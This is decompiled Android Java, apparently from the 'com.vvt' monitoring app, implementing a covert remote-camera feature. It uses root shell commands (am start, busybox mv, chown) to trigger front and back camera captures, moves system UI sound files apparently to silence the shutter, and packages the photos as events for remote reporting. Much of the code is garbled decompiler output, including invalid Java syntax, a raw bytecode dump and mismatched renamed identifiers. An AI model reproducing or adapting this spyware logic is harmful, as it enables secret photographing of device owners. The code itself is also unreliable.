package com.vvt.appengine.a;

import android.content.Context;
import android.content.Intent;
import android.os.ConditionVariable;
import android.os.SystemClock;
import com.remote.camera.normal.RemoteCameraActivity;
import com.vvt.appengine.AppEngine1;
import com.vvt.base.FxEvent;
import com.vvt.events.FxMediaType;
import com.vvt.events.FxRemoteCameraImageEvent;
import com.vvt.io.p;
import com.vvt.remotecontrol.output.RmtCtrlOutputStatusMessage;
import com.vvt.shell.KMShell;
import com.vvt.shell.ShellUtil;
import com.vvt.shell.f;
import java.io.File;
import java.util.ArrayList;
import java.util.List;

public class v
{
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.e;
  private ConditionVariable c;
  private RmtCtrlOutputStatusMessage d;
  private AppEngine1 e;
  private boolean f;
  private List g;
  
  public v()
  {
    RmtCtrlOutputStatusMessage localRmtCtrlOutputStatusMessage = new com/vvt/remotecontrol/output/RmtCtrlOutputStatusMessage;
    localRmtCtrlOutputStatusMessage.<init>();
    this.d = localRmtCtrlOutputStatusMessage;
    this.f = false;
  }
  
  private FxEvent a(String paramString1, String paramString2, int paramInt)
  {
    boolean bool1 = a;
    if (bool1) {}
    bool1 = a;
    if (bool1) {}
    bool1 = a;
    if (bool1) {}
    bool1 = a;
    if (bool1) {}
    FxRemoteCameraImageEvent localFxRemoteCameraImageEvent = new com/vvt/events/FxRemoteCameraImageEvent;
    localFxRemoteCameraImageEvent.<init>();
    localFxRemoteCameraImageEvent.setParingId(0L);
    FxMediaType localFxMediaType = FxMediaType.JPEG;
    localFxRemoteCameraImageEvent.setFormat(localFxMediaType);
    localFxRemoteCameraImageEvent.setCameraType(paramInt);
    localFxRemoteCameraImageEvent.setFileName(paramString2);
    localFxRemoteCameraImageEvent.setFilePath(paramString1);
    long l = System.currentTimeMillis();
    localFxRemoteCameraImageEvent.setEventTime(l);
    localFxMediaType = null;
    localFxRemoteCameraImageEvent.setGeoTag(null);
    boolean bool2 = a;
    if (bool2) {}
    return localFxRemoteCameraImageEvent;
  }
  
  private String a(String paramString)
  {
    String str1 = null;
    File localFile1 = new java/io/File;
    localFile1.<init>("/system/media/audio/ui");
    File[] arrayOfFile = localFile1.listFiles();
    int i = arrayOfFile.length;
    int j = 0;
    localFile1 = null;
    for (;;)
    {
      if (j < i)
      {
        File localFile2 = arrayOfFile[j];
        String str2 = localFile2.getName().toLowerCase();
        String str3 = paramString.toLowerCase();
        boolean bool = str2.contains(str3);
        if (bool) {
          str1 = localFile2.getName();
        }
      }
      else
      {
        return str1;
      }
      j += 1;
    }
  }
  
  private ArrayList a(String paramString1, String paramString2)
  {
    int i = 1;
    int j = 2;
    int k = 0;
    Object localObject1 = null;
    boolean bool2 = a;
    if (bool2) {}
    bool2 = a;
    if (bool2) {}
    bool2 = false;
    Object localObject3 = null;
    for (;;)
    {
      Object localObject4;
      boolean bool4;
      long l2;
      boolean bool3;
      try
      {
        localObject3 = f.a();
        localObject4 = "am start --es path_back %s --es path_front %s -a com.android.system.action.MyUncaughtExceptionHandler.capture";
        int m = 2;
        Object localObject5 = new Object[m];
        int n = 0;
        localObject6 = null;
        localObject5[0] = paramString1;
        n = 1;
        localObject5[n] = paramString2;
        localObject4 = String.format((String)localObject4, (Object[])localObject5);
        ((f)localObject3).a((String)localObject4);
        bool4 = a;
        if ((!bool4) || (localObject3 != null)) {
          ((f)localObject3).d();
        }
        localObject3 = p.a(com.vvt.m.a.d, paramString1);
        localObject4 = p.a(com.vvt.m.a.d, paramString2);
        long l1 = System.currentTimeMillis();
        l2 = 60000L;
        l1 += l2;
        l2 = System.currentTimeMillis();
        bool5 = l2 < l1;
        if (bool5)
        {
          bool3 = a;
          if (bool3) {}
          localObject5 = p.a(this.e.b(), "remote_cam");
          localObject6 = new java/io/File;
          ((File)localObject6).<init>((String)localObject5);
          bool5 = ((File)localObject6).exists();
          if (!bool5) {
            ((File)localObject6).mkdirs();
          }
          localObject6 = new String[j];
          localObject6[0] = paramString1;
          localObject6[i] = paramString2;
          localObject7 = new String[j];
          localObject7[0] = localObject3;
          localObject7[i] = localObject4;
          localObject3 = new java/util/ArrayList;
          ((ArrayList)localObject3).<init>();
          if (k >= j) {
            break;
          }
          localObject4 = localObject6[k];
          localObject4 = p.a((String)localObject5, (String)localObject4);
          bool6 = a;
          if (bool6) {}
          localObject8 = new java/io/File;
          localObject9 = localObject7[k];
          ((File)localObject8).<init>((String)localObject9);
          bool6 = ((File)localObject8).exists();
          if (!bool6) {
            break label709;
          }
          bool6 = a;
          if (!bool6) {}
        }
      }
      finally
      {
        Object localObject6;
        boolean bool6;
        Object localObject9;
        int i2;
        Object[] arrayOfObject;
        Object localObject10;
        int i1;
        if (localObject3 != null) {
          ((f)localObject3).d();
        }
      }
      try
      {
        localObject8 = com.vvt.m.b.c;
        localObject9 = "busybox";
        localObject8 = p.a((String)localObject8, (String)localObject9);
        localObject9 = "%s mv -f %s %s";
        i2 = 3;
        arrayOfObject = new Object[i2];
        localObject10 = null;
        arrayOfObject[0] = localObject8;
        bool6 = true;
        localObject10 = localObject7[k];
        arrayOfObject[bool6] = localObject10;
        i1 = 2;
        arrayOfObject[i1] = localObject4;
        localObject8 = String.format((String)localObject9, arrayOfObject);
        KMShell.a((String)localObject8);
        localObject8 = new java/io/File;
        ((File)localObject8).<init>((String)localObject4);
        bool7 = ((File)localObject8).exists();
        if (!bool7) {
          break label681;
        }
        bool7 = a;
        if (bool7) {}
        localObject8 = "chown %s.%s %s";
        i = 3;
        localObject9 = new Object[i];
        i2 = 0;
        arrayOfObject = null;
        localObject10 = this.e;
        localObject10 = ((AppEngine1)localObject10).c();
        localObject9[0] = localObject10;
        i2 = 1;
        localObject10 = this.e;
        localObject10 = ((AppEngine1)localObject10).c();
        localObject9[i2] = localObject10;
        i2 = 2;
        localObject9[i2] = localObject4;
        localObject8 = String.format((String)localObject8, (Object[])localObject9);
        KMShell.a((String)localObject8);
        bool7 = com.vvt.aa.a.c();
        if (bool7) {
          ShellUtil.k((String)localObject4);
        }
        localObject8 = localObject6[k];
        localObject4 = a((String)localObject4, (String)localObject8, k);
        ((ArrayList)localObject3).add(localObject4);
      }
      catch (Exception localException)
      {
        bool4 = b;
        if (!bool4) {
          continue;
        }
        continue;
      }
      k += 1;
      continue;
      Object localObject7 = new java/io/File;
      ((File)localObject7).<init>((String)localObject3);
      boolean bool5 = ((File)localObject7).exists();
      Object localObject8 = new java/io/File;
      ((File)localObject8).<init>((String)localObject4);
      boolean bool7 = ((File)localObject8).exists();
      if ((bool5) && (bool7))
      {
        bool3 = a;
        if (!bool3) {}
      }
      else
      {
        l2 = 3000L;
        SystemClock.sleep(l2);
        continue;
        label681:
        bool7 = b;
        if (bool7)
        {
          continue;
          label709:
          bool4 = b;
          if (!bool4) {}
        }
      }
    }
    boolean bool1 = a;
    if (bool1) {}
    return (ArrayList)localObject3;
  }
  
  private void a(Context paramContext, String paramString1, String paramString2)
  {
    bool = a;
    if (bool) {}
    try
    {
      Object localObject1 = new java/util/ArrayList;
      ((ArrayList)localObject1).<init>();
      this.g = ((List)localObject1);
      localObject1 = new com/vvt/appengine/a/w;
      ((w)localObject1).<init>(this);
      com.remote.camera.normal.i.b = (com.remote.camera.normal.b)localObject1;
      bool = a;
      if (bool) {}
      localObject1 = new android/content/Intent;
      Object localObject2 = RemoteCameraActivity.class;
      ((Intent)localObject1).<init>(paramContext, (Class)localObject2);
      int i = 1417707520;
      ((Intent)localObject1).setFlags(i);
      localObject2 = "path_back";
      ((Intent)localObject1).putExtra((String)localObject2, paramString1);
      localObject2 = "path_front";
      ((Intent)localObject1).putExtra((String)localObject2, paramString2);
      paramContext.startActivity((Intent)localObject1);
      bool = a;
      if (bool) {}
      localObject1 = this.c;
      long l = 60000L;
      ((ConditionVariable)localObject1).block(l);
    }
    catch (Exception localException)
    {
      for (;;)
      {
        bool = b;
        if (!bool) {}
      }
    }
    bool = a;
    if (bool) {}
  }
  
  private void a(f paramf, File paramFile1, File paramFile2)
  {
    long l = 1000L;
    boolean bool1 = true;
    if (paramf != null)
    {
      boolean bool2 = paramFile1.exists();
      if (bool2)
      {
        bool2 = a;
        if (bool2) {}
        ShellUtil.a(bool1);
        SystemClock.sleep(l);
        int i = 2;
        Object[] arrayOfObject = new Object[i];
        String str1 = paramFile1.getAbsolutePath();
        arrayOfObject[0] = str1;
        str1 = paramFile2.getAbsolutePath();
        arrayOfObject[bool1] = str1;
        String str2 = String.format("mv %s %s", arrayOfObject);
        paramf.a(str2);
        SystemClock.sleep(l);
        ShellUtil.a(false);
        bool2 = paramFile2.exists();
        if (!bool2) {}
      }
    }
  }
  
  /* Error */
  public RmtCtrlOutputStatusMessage a(AppEngine1 paramh)
  {
    // Byte code:
    //   0: iconst_0
    //   1: istore_2
    //   2: aconst_null
    //   3: astore_3
    //   4: aload_0
    //   5: monitorenter
    //   6: aload_0
    //   7: aload_1
    //   8: putfield 139	com/vvt/appengine/a/v:e	Lcom/vvt/appengine/AppEngine1;
    //   11: new 236	android/os/ConditionVariable
    //   14: astore 4
    //   16: iconst_0
    //   17: istore 5
    //   19: aconst_null
    //   20: astore 6
    //   22: aload 4
    //   24: iconst_0
    //   25: invokespecial 254	android/os/ConditionVariable:<init>	(Z)V
    //   28: aload_0
    //   29: aload 4
    //   31: putfield 38	com/vvt/appengine/a/v:MyUncaughtExceptionHandler	Landroid/os/ConditionVariable;
    //   34: new 256	java/lang/StringBuilder
    //   37: astore 4
    //   39: aload 4
    //   41: invokespecial 257	java/lang/StringBuilder:<init>	()V
    //   44: ldc_w 259
    //   47: astore 6
    //   49: aload 4
    //   51: aload 6
    //   53: invokevirtual 263	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   56: astore 4
    //   58: new 265	java/text/SimpleDateFormat
    //   61: astore 6
    //   63: ldc_w 267
    //   66: astore 7
    //   68: aload 6
    //   70: aload 7
    //   72: invokespecial 268	java/text/SimpleDateFormat:<init>	(Ljava/lang/String;)V
    //   75: new 270	java/util/Date
    //   78: astore 7
    //   80: aload 7
    //   82: invokespecial 271	java/util/Date:<init>	()V
    //   85: aload 6
    //   87: aload 7
    //   89: invokevirtual 274	java/text/SimpleDateFormat:format	(Ljava/util/Date;)Ljava/lang/String;
    //   92: astore 6
    //   94: aload 4
    //   96: aload 6
    //   98: invokevirtual 263	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   101: astore 4
    //   103: ldc_w 276
    //   106: astore 6
    //   108: aload 4
    //   110: aload 6
    //   112: invokevirtual 263	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   115: astore 4
    //   117: aload 4
    //   119: invokevirtual 279	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   122: astore 8
    //   124: getstatic 21	com/vvt/appengine/a/v:a	Z
    //   127: istore 9
    //   129: iload 9
    //   131: ifeq +3 -> 134
    //   134: new 256	java/lang/StringBuilder
    //   137: astore 4
    //   139: aload 4
    //   141: invokespecial 257	java/lang/StringBuilder:<init>	()V
    //   144: ldc_w 281
    //   147: astore 6
    //   149: aload 4
    //   151: aload 6
    //   153: invokevirtual 263	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   156: astore 4
    //   158: new 265	java/text/SimpleDateFormat
    //   161: astore 6
    //   163: ldc_w 267
    //   166: astore 7
    //   168: aload 6
    //   170: aload 7
    //   172: invokespecial 268	java/text/SimpleDateFormat:<init>	(Ljava/lang/String;)V
    //   175: new 270	java/util/Date
    //   178: astore 7
    //   180: aload 7
    //   182: invokespecial 271	java/util/Date:<init>	()V
    //   185: aload 6
    //   187: aload 7
    //   189: invokevirtual 274	java/text/SimpleDateFormat:format	(Ljava/util/Date;)Ljava/lang/String;
    //   192: astore 6
    //   194: aload 4
    //   196: aload 6
    //   198: invokevirtual 263	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   201: astore 4
    //   203: ldc_w 276
    //   206: astore 6
    //   208: aload 4
    //   210: aload 6
    //   212: invokevirtual 263	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   215: astore 4
    //   217: aload 4
    //   219: invokevirtual 279	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   222: astore 10
    //   224: getstatic 21	com/vvt/appengine/a/v:a	Z
    //   227: istore 9
    //   229: iload 9
    //   231: ifeq +3 -> 234
    //   234: new 84	java/io/File
    //   237: astore 11
    //   239: ldc 86
    //   241: astore 4
    //   243: aload 11
    //   245: aload 4
    //   247: invokespecial 88	java/io/File:<init>	(Ljava/lang/String;)V
    //   250: new 84	java/io/File
    //   253: astore 12
    //   255: ldc_w 283
    //   258: astore 4
    //   260: aload 12
    //   262: aload 11
    //   264: aload 4
    //   266: invokespecial 286	java/io/File:<init>	(Ljava/io/File;Ljava/lang/String;)V
    //   269: new 84	java/io/File
    //   272: astore 13
    //   274: ldc_w 288
    //   277: astore 4
    //   279: aload 13
    //   281: aload 11
    //   283: aload 4
    //   285: invokespecial 286	java/io/File:<init>	(Ljava/io/File;Ljava/lang/String;)V
    //   288: aload_1
    //   289: invokevirtual 291	com/vvt/appengine/AppEngine1:d	()Lcom/vvt/base/RunningMode;
    //   292: astore 4
    //   294: getstatic 297	com/vvt/base/RunningMode:FULL	Lcom/vvt/base/RunningMode;
    //   297: astore 6
    //   299: aload 4
    //   301: aload 6
    //   303: if_acmpeq +21 -> 324
    //   306: aload_1
    //   307: invokevirtual 291	com/vvt/appengine/AppEngine1:d	()Lcom/vvt/base/RunningMode;
    //   310: astore 4
    //   312: getstatic 300	com/vvt/base/RunningMode:LIMITED_1	Lcom/vvt/base/RunningMode;
    //   315: astore 6
    //   317: aload 4
    //   319: aload 6
    //   321: if_acmpne +916 -> 1237
    //   324: invokestatic 302	com/vvt/shell/f:removeFromPath	()Lcom/vvt/shell/f;
    //   327: astore 6
    //   329: getstatic 21	com/vvt/appengine/a/v:a	Z
    //   332: istore 9
    //   334: iload 9
    //   336: ifeq +3 -> 339
    //   339: ldc_w 304
    //   342: astore 4
    //   344: aload_0
    //   345: aload 4
    //   347: invokespecial 305	com/vvt/appengine/a/v:a	(Ljava/lang/String;)Ljava/lang/String;
    //   350: astore 7
    //   352: aload 7
    //   354: ifnull +673 -> 1027
    //   357: getstatic 21	com/vvt/appengine/a/v:a	Z
    //   360: istore 9
    //   362: iload 9
    //   364: ifeq +3 -> 367
    //   367: new 256	java/lang/StringBuilder
    //   370: astore 4
    //   372: aload 4
    //   374: invokespecial 257	java/lang/StringBuilder:<init>	()V
    //   377: ldc_w 307
    //   380: astore 14
    //   382: aload 4
    //   384: aload 14
    //   386: invokevirtual 263	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   389: astore 4
    //   391: aload 4
    //   393: aload 7
    //   395: invokevirtual 263	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   398: astore 4
    //   400: aload 4
    //   402: invokevirtual 279	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   405: astore 14
    //   407: new 84	java/io/File
    //   410: astore 4
    //   412: aload 4
    //   414: aload 11
    //   416: aload 7
    //   418: invokespecial 286	java/io/File:<init>	(Ljava/io/File;Ljava/lang/String;)V
    //   421: new 84	java/io/File
    //   424: astore 7
    //   426: aload 7
    //   428: aload 11
    //   430: aload 14
    //   432: invokespecial 286	java/io/File:<init>	(Ljava/io/File;Ljava/lang/String;)V
    //   435: aload 7
    //   437: astore_3
    //   438: getstatic 21	com/vvt/appengine/a/v:a	Z
    //   441: istore 15
    //   443: iload 15
    //   445: ifeq +3 -> 448
    //   448: aload_0
    //   449: aload 6
    //   451: aload 12
    //   453: aload 13
    //   455: invokespecial 310	com/vvt/appengine/a/v:a	(Lcom/vvt/shell/f;Ljava/io/File;Ljava/io/File;)V
    //   458: aload 4
    //   460: ifnull +22 -> 482
    //   463: getstatic 21	com/vvt/appengine/a/v:a	Z
    //   466: istore 15
    //   468: iload 15
    //   470: ifeq +3 -> 473
    //   473: aload_0
    //   474: aload 6
    //   476: aload 4
    //   478: aload_3
    //   479: invokespecial 310	com/vvt/appengine/a/v:a	(Lcom/vvt/shell/f;Ljava/io/File;Ljava/io/File;)V
    //   482: aload_1
    //   483: invokevirtual 291	com/vvt/appengine/AppEngine1:d	()Lcom/vvt/base/RunningMode;
    //   486: astore 7
    //   488: getstatic 297	com/vvt/base/RunningMode:FULL	Lcom/vvt/base/RunningMode;
    //   491: astore 11
    //   493: aload 7
    //   495: aload 11
    //   497: if_acmpne +219 -> 716
    //   500: getstatic 21	com/vvt/appengine/a/v:a	Z
    //   503: istore 15
    //   505: iload 15
    //   507: ifeq +3 -> 510
    //   510: aload_1
    //   511: invokevirtual 313	com/vvt/appengine/AppEngine1:a	()Landroid/content/Context;
    //   514: astore 7
    //   516: ldc_w 315
    //   519: astore 11
    //   521: aload 7
    //   523: aload 11
    //   525: invokestatic 320	com/vvt/ab/e:a	(Landroid/content/Context;Ljava/lang/String;)Z
    //   528: istore 15
    //   530: getstatic 21	com/vvt/appengine/a/v:a	Z
    //   533: istore 16
    //   535: iload 16
    //   537: ifeq +3 -> 540
    //   540: iload 15
    //   542: ifne +59 -> 601
    //   545: getstatic 21	com/vvt/appengine/a/v:a	Z
    //   548: istore 15
    //   550: iload 15
    //   552: ifeq +3 -> 555
    //   555: getstatic 321	com/vvt/m/a:MyUncaughtExceptionHandler	Ljava/lang/String;
    //   558: astore 7
    //   560: aload 7
    //   562: invokestatic 323	com/vvt/shell/ShellUtil:FxFileObserverWorker	(Ljava/lang/String;)V
    //   565: getstatic 21	com/vvt/appengine/a/v:a	Z
    //   568: istore 15
    //   570: iload 15
    //   572: ifeq +3 -> 575
    //   575: aload_1
    //   576: invokevirtual 313	com/vvt/appengine/AppEngine1:a	()Landroid/content/Context;
    //   579: astore 7
    //   581: ldc_w 315
    //   584: astore 11
    //   586: ldc_w 324
    //   589: istore 17
    //   591: aload 7
    //   593: aload 11
    //   595: iload 17
    //   597: invokestatic 328	com/vvt/ab/e:a	(Landroid/content/Context;Ljava/lang/String;I)Z
    //   600: pop
    //   601: new 154	java/util/ArrayList
    //   604: astore 7
    //   606: aload 7
    //   608: invokespecial 155	java/util/ArrayList:<init>	()V
    //   611: getstatic 21	com/vvt/appengine/a/v:a	Z
    //   614: istore 16
    //   616: iload 16
    //   618: ifeq +3 -> 621
    //   621: aload_0
    //   622: aload 8
    //   624: aload 10
    //   626: invokespecial 331	com/vvt/appengine/a/v:a	(Ljava/lang/String;Ljava/lang/String;)Ljava/util/ArrayList;
    //   629: astore 11
    //   631: aload 11
    //   633: invokevirtual 335	java/util/ArrayList:size	()I
    //   636: istore 17
    //   638: iload 17
    //   640: ifle +13 -> 653
    //   643: aload 7
    //   645: aload 11
    //   647: invokeinterface 341 2 0
    //   652: pop
    //   653: aload 7
    //   655: invokeinterface 342 1 0
    //   660: istore 16
    //   662: iload 16
    //   664: ifle +409 -> 1073
    //   667: iconst_1
    //   668: istore 16
    //   670: aload_0
    //   671: iload 16
    //   673: putfield 36	com/vvt/appengine/a/v:f	Z
    //   676: aload_0
    //   677: getfield 139	com/vvt/appengine/a/v:e	Lcom/vvt/appengine/AppEngine1;
    //   680: astore 11
    //   682: aload 11
    //   684: getfield 346	com/vvt/appengine/AppEngine1:AppEngine1	Lcom/vvt/appengine/q;
    //   687: astore 11
    //   689: aload 11
    //   691: aload 7
    //   693: invokevirtual 351	com/vvt/appengine/q:a	(Ljava/util/List;)V
    //   696: invokestatic 353	com/vvt/aa/a:removeFromPath	()Z
    //   699: istore 15
    //   701: iload 15
    //   703: ifeq +383 -> 1086
    //   706: getstatic 21	com/vvt/appengine/a/v:a	Z
    //   709: istore 15
    //   711: iload 15
    //   713: ifeq +3 -> 716
    //   716: aload_1
    //   717: invokevirtual 291	com/vvt/appengine/AppEngine1:d	()Lcom/vvt/base/RunningMode;
    //   720: astore 7
    //   722: getstatic 356	com/vvt/base/RunningMode:NORMAL	Lcom/vvt/base/RunningMode;
    //   725: astore 11
    //   727: aload 7
    //   729: aload 11
    //   731: if_acmpeq +21 -> 752
    //   734: aload_1
    //   735: invokevirtual 291	com/vvt/appengine/AppEngine1:d	()Lcom/vvt/base/RunningMode;
    //   738: astore 7
    //   740: getstatic 300	com/vvt/base/RunningMode:LIMITED_1	Lcom/vvt/base/RunningMode;
    //   743: astore 11
    //   745: aload 7
    //   747: aload 11
    //   749: if_acmpne +95 -> 844
    //   752: getstatic 21	com/vvt/appengine/a/v:a	Z
    //   755: istore 15
    //   757: iload 15
    //   759: ifeq +3 -> 762
    //   762: aload_1
    //   763: invokevirtual 313	com/vvt/appengine/AppEngine1:a	()Landroid/content/Context;
    //   766: astore 7
    //   768: aload_0
    //   769: aload 7
    //   771: aload 8
    //   773: aload 10
    //   775: invokespecial 359	com/vvt/appengine/a/v:a	(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    //   778: aload_0
    //   779: getfield 197	com/vvt/appengine/a/v:FxFileObserverWorker	Ljava/util/List;
    //   782: astore 7
    //   784: aload 7
    //   786: ifnull +328 -> 1114
    //   789: aload_0
    //   790: getfield 197	com/vvt/appengine/a/v:FxFileObserverWorker	Ljava/util/List;
    //   793: astore 7
    //   795: aload 7
    //   797: invokeinterface 362 1 0
    //   802: istore 15
    //   804: iload 15
    //   806: ifne +308 -> 1114
    //   809: iconst_1
    //   810: istore 15
    //   812: aload_0
    //   813: iload 15
    //   815: putfield 36	com/vvt/appengine/a/v:f	Z
    //   818: aload_0
    //   819: getfield 139	com/vvt/appengine/a/v:e	Lcom/vvt/appengine/AppEngine1;
    //   822: astore 7
    //   824: aload 7
    //   826: getfield 346	com/vvt/appengine/AppEngine1:AppEngine1	Lcom/vvt/appengine/q;
    //   829: astore 7
    //   831: aload_0
    //   832: getfield 197	com/vvt/appengine/a/v:FxFileObserverWorker	Ljava/util/List;
    //   835: astore 8
    //   837: aload 7
    //   839: aload 8
    //   841: invokevirtual 351	com/vvt/appengine/q:a	(Ljava/util/List;)V
    //   844: aload_1
    //   845: invokevirtual 291	com/vvt/appengine/AppEngine1:d	()Lcom/vvt/base/RunningMode;
    //   848: astore 7
    //   850: getstatic 297	com/vvt/base/RunningMode:FULL	Lcom/vvt/base/RunningMode;
    //   853: astore 8
    //   855: aload 7
    //   857: aload 8
    //   859: if_acmpeq +21 -> 880
    //   862: aload_1
    //   863: invokevirtual 291	com/vvt/appengine/AppEngine1:d	()Lcom/vvt/base/RunningMode;
    //   866: astore 7
    //   868: getstatic 300	com/vvt/base/RunningMode:LIMITED_1	Lcom/vvt/base/RunningMode;
    //   871: astore 8
    //   873: aload 7
    //   875: aload 8
    //   877: if_acmpne +74 -> 951
    //   880: aload 13
    //   882: invokevirtual 149	java/io/File:exists	()Z
    //   885: istore 15
    //   887: iload 15
    //   889: ifeq +249 -> 1138
    //   892: getstatic 21	com/vvt/appengine/a/v:a	Z
    //   895: istore 15
    //   897: iload 15
    //   899: ifeq +3 -> 902
    //   902: aload_0
    //   903: aload 6
    //   905: aload 13
    //   907: aload 12
    //   909: invokespecial 310	com/vvt/appengine/a/v:a	(Lcom/vvt/shell/f;Ljava/io/File;Ljava/io/File;)V
    //   912: aload_3
    //   913: ifnull +238 -> 1151
    //   916: aload_3
    //   917: invokevirtual 149	java/io/File:exists	()Z
    //   920: istore 15
    //   922: iload 15
    //   924: ifeq +227 -> 1151
    //   927: aload 4
    //   929: ifnull +22 -> 951
    //   932: getstatic 21	com/vvt/appengine/a/v:a	Z
    //   935: istore 15
    //   937: iload 15
    //   939: ifeq +3 -> 942
    //   942: aload_0
    //   943: aload 6
    //   945: aload_3
    //   946: aload 4
    //   948: invokespecial 310	com/vvt/appengine/a/v:a	(Lcom/vvt/shell/f;Ljava/io/File;Ljava/io/File;)V
    //   951: aload_0
    //   952: getfield 36	com/vvt/appengine/a/v:f	Z
    //   955: istore_2
    //   956: iload_2
    //   957: ifeq +211 -> 1168
    //   960: aload_0
    //   961: getfield 34	com/vvt/appengine/a/v:d	Lcom/vvt/remotecontrol/output/RmtCtrlOutputStatusMessage;
    //   964: astore 4
    //   966: aload 4
    //   968: monitorenter
    //   969: aload_0
    //   970: getfield 34	com/vvt/appengine/a/v:d	Lcom/vvt/remotecontrol/output/RmtCtrlOutputStatusMessage;
    //   973: astore_3
    //   974: iconst_1
    //   975: istore 5
    //   977: aload_3
    //   978: iload 5
    //   980: invokevirtual 365	com/vvt/remotecontrol/output/RmtCtrlOutputStatusMessage:setSuccess	(Z)V
    //   983: aload_0
    //   984: getfield 34	com/vvt/appengine/a/v:d	Lcom/vvt/remotecontrol/output/RmtCtrlOutputStatusMessage;
    //   987: astore_3
    //   988: ldc_w 367
    //   991: astore 6
    //   993: aload_3
    //   994: aload 6
    //   996: invokevirtual 370	com/vvt/remotecontrol/output/RmtCtrlOutputStatusMessage:setMessage	(Ljava/lang/String;)V
    //   999: aload 4
    //   1001: monitorexit
    //   1002: getstatic 21	com/vvt/appengine/a/v:a	Z
    //   1005: istore_2
    //   1006: iload_2
    //   1007: ifeq +3 -> 1010
    //   1010: getstatic 21	com/vvt/appengine/a/v:a	Z
    //   1013: istore_2
    //   1014: iload_2
    //   1015: ifeq +3 -> 1018
    //   1018: aload_0
    //   1019: getfield 34	com/vvt/appengine/a/v:d	Lcom/vvt/remotecontrol/output/RmtCtrlOutputStatusMessage;
    //   1022: astore_3
    //   1023: aload_0
    //   1024: monitorexit
    //   1025: aload_3
    //   1026: areturn
    //   1027: getstatic 21	com/vvt/appengine/a/v:a	Z
    //   1030: istore 9
    //   1032: iload 9
    //   1034: ifeq +3 -> 1037
    //   1037: iconst_0
    //   1038: istore 9
    //   1040: aconst_null
    //   1041: astore 4
    //   1043: goto -605 -> 438
    //   1046: astore 4
    //   1048: iconst_0
    //   1049: istore 9
    //   1051: aconst_null
    //   1052: astore 4
    //   1054: iconst_0
    //   1055: istore 5
    //   1057: aconst_null
    //   1058: astore 6
    //   1060: getstatic 25	com/vvt/appengine/a/v:removeFromPath	Z
    //   1063: istore 15
    //   1065: iload 15
    //   1067: ifeq -585 -> 482
    //   1070: goto -588 -> 482
    //   1073: getstatic 21	com/vvt/appengine/a/v:a	Z
    //   1076: istore 15
    //   1078: iload 15
    //   1080: ifeq -384 -> 696
    //   1083: goto -387 -> 696
    //   1086: getstatic 21	com/vvt/appengine/a/v:a	Z
    //   1089: istore 15
    //   1091: iload 15
    //   1093: ifeq +3 -> 1096
    //   1096: ldc_w 315
    //   1099: astore 7
    //   1101: aload 7
    //   1103: invokestatic 372	com/vvt/shell/ShellUtil:AppEngine1	(Ljava/lang/String;)V
    //   1106: goto -390 -> 716
    //   1109: astore_3
    //   1110: aload_0
    //   1111: monitorexit
    //   1112: aload_3
    //   1113: athrow
    //   1114: iconst_0
    //   1115: istore 15
    //   1117: aconst_null
    //   1118: astore 7
    //   1120: aload_0
    //   1121: iconst_0
    //   1122: putfield 36	com/vvt/appengine/a/v:f	Z
    //   1125: getstatic 21	com/vvt/appengine/a/v:a	Z
    //   1128: istore 15
    //   1130: iload 15
    //   1132: ifeq -288 -> 844
    //   1135: goto -291 -> 844
    //   1138: getstatic 25	com/vvt/appengine/a/v:removeFromPath	Z
    //   1141: istore 15
    //   1143: iload 15
    //   1145: ifeq -233 -> 912
    //   1148: goto -236 -> 912
    //   1151: getstatic 25	com/vvt/appengine/a/v:removeFromPath	Z
    //   1154: istore_2
    //   1155: iload_2
    //   1156: ifeq -205 -> 951
    //   1159: goto -208 -> 951
    //   1162: astore_3
    //   1163: aload 4
    //   1165: monitorexit
    //   1166: aload_3
    //   1167: athrow
    //   1168: aload_0
    //   1169: getfield 34	com/vvt/appengine/a/v:d	Lcom/vvt/remotecontrol/output/RmtCtrlOutputStatusMessage;
    //   1172: astore 4
    //   1174: aload 4
    //   1176: monitorenter
    //   1177: aload_0
    //   1178: getfield 34	com/vvt/appengine/a/v:d	Lcom/vvt/remotecontrol/output/RmtCtrlOutputStatusMessage;
    //   1181: astore_3
    //   1182: iconst_0
    //   1183: istore 5
    //   1185: aconst_null
    //   1186: astore 6
    //   1188: aload_3
    //   1189: iconst_0
    //   1190: invokevirtual 365	com/vvt/remotecontrol/output/RmtCtrlOutputStatusMessage:setSuccess	(Z)V
    //   1193: aload_0
    //   1194: getfield 34	com/vvt/appengine/a/v:d	Lcom/vvt/remotecontrol/output/RmtCtrlOutputStatusMessage;
    //   1197: astore_3
    //   1198: ldc_w 374
    //   1201: astore 6
    //   1203: aload_3
    //   1204: aload 6
    //   1206: invokevirtual 370	com/vvt/remotecontrol/output/RmtCtrlOutputStatusMessage:setMessage	(Ljava/lang/String;)V
    //   1209: aload 4
    //   1211: monitorexit
    //   1212: goto -210 -> 1002
    //   1215: astore_3
    //   1216: aload 4
    //   1218: monitorexit
    //   1219: aload_3
    //   1220: athrow
    //   1221: astore 4
    //   1223: iconst_0
    //   1224: istore 9
    //   1226: aconst_null
    //   1227: astore 4
    //   1229: goto -169 -> 1060
    //   1232: astore 7
    //   1234: goto -174 -> 1060
    //   1237: iconst_0
    //   1238: istore 9
    //   1240: aconst_null
    //   1241: astore 4
    //   1243: iconst_0
    //   1244: istore 5
    //   1246: aconst_null
    //   1247: astore 6
    //   1249: goto -767 -> 482
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	1252	0	this	v
    //   0	1252	1	paramh	AppEngine1
    //   1	1155	2	bool1	boolean
    //   3	1023	3	localObject1	Object
    //   1109	4	3	localObject2	Object
    //   1162	5	3	localObject3	Object
    //   1181	23	3	localRmtCtrlOutputStatusMessage1	RmtCtrlOutputStatusMessage
